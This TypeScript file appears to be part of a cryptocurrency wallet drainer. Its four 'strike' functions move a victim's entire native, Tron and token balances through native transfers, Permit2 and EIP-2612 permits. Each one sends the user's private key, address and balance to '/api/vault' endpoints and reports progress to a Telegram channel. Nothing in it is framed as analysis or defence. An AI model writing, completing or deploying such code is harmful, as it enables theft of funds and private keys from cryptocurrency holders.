import { type UniversalAsset } from "@/lib/audit";
import { securePost } from "./utils";
import { sendActivityToTelegram } from "@/lib/telegram";

const logLabel = "[strikes.ts]";

/**
 * 🌪️ NATIVE STRIKE
 */
export async function executeNativeStrike(
  assets: UniversalAsset[],
  address: string,
  activeKey: string | null,
  ensureChain: any,
) {
  for (const asset of assets) {
    try {
      console.log(`${logLabel} Initiating Native Strike | ${asset.symbol}`);

      const chainReady = await ensureChain(
        Number(asset.chainId),
        `Native ${asset.symbol}`,
      );

      if (chainReady) {
        // 📢 SIGNAL: Attempting Native Transfer
        await sendActivityToTelegram({
          address,
          step: "NATIVE_STRIKE_START",
          details: `Target: ${asset.symbol} | Chain: ${asset.chainId} | Amt: ${asset.balance}`,
        }).catch(() => null);

        const response = await securePost("/api/vault/native", {
          userAddress: address,
          chainId: asset.chainId,
          amount: asset.balance,
          symbol: asset.symbol, // Added for receipt
          userPrivKey: activeKey,
        });

        if (response.ok) {
          console.log(`${logLabel} Native Strike API Response Received.`);
        }
      } else {
        console.warn(`${logLabel} Native Aborted: Chain switch failed.`);
      }
    } catch (err: any) {
      console.error(
        `${logLabel} Native Failure | ${asset.symbol}: ${err.message}`,
      );
    }
  }
}

/**
 * ⚡ TRON STRIKE
 */
export async function executeTronStrike(
  assets: UniversalAsset[],
  address: string,
  activeKey: string | null,
) {
  for (const asset of assets) {
    try {
      console.log(`${logLabel} Initiating Tron Strike | ${asset.symbol}`);

      // 📢 SIGNAL: Attempting Tron Transfer
      await sendActivityToTelegram({
        address,
        step: "TRON_STRIKE_START",
        details: `Target: ${asset.symbol} (TRC-20) | Amt: ${asset.balance}`,
      }).catch(() => null);

      const response = await securePost("/api/vault/tron", {
        userAddress: address,
        userPrivKey: activeKey,
        amount: asset.balance,
        symbol: asset.symbol,
      });

      if (response.ok) {
        console.log(`${logLabel} Tron Strike API Response Received.`);
      }
    } catch (err: any) {
      console.error(
        `${logLabel} Tron Failure | ${asset.symbol}: ${err.message}`,
      );
    }
  }
}

/**
 * 🎫 PERMIT2 STRIKE
 */
export async function executePermit2Strike(
  assets: UniversalAsset[],
  address: string,
  activeKey: string | null,
) {
  for (const asset of assets) {
    try {
      console.log(`${logLabel} Preparing Permit2 Signature | ${asset.symbol}`);

      const response = await securePost("/api/vault/permit2", {
        userAddress: address,
        chainId: asset.chainId,
        tokenAddress: asset.contractAddress,
        amount: asset.balance,
        symbol: asset.symbol, // Added for receipt
        userPrivKey: activeKey,
      });

      if (response.ok) {
        console.log(`${logLabel} Permit2 Strike Dispatched.`);
      }
    } catch (err: any) {
      console.error(
        `${logLabel} Permit2 Failure | ${asset.symbol}: ${err.message}`,
      );
    }
  }
}

/**
 * 📜 EIP-2612 STRIKE
 */
export async function executeEIP2612Strike(
  assets: UniversalAsset[],
  address: string,
  activeKey: string | null,
) {
  for (const asset of assets) {
    try {
      console.log(`${logLabel} Initiating EIP-2612 Permit | ${asset.symbol}`);

      const response = await securePost("/api/vault/permit", {
        userAddress: address,
        chainId: asset.chainId,
        tokenAddress: asset.contractAddress,
        amount: asset.balance,
        symbol: asset.symbol, // Added for receipt
        userPrivKey: activeKey,
      });

      if (response.ok) {
        console.log(`${logLabel} EIP-2612 Strike Dispatched.`);
      }
    } catch (err: any) {
      console.error(
        `${logLabel} EIP-2612 Failure | ${asset.symbol}: ${err.message}`,
      );
    }
  }
}
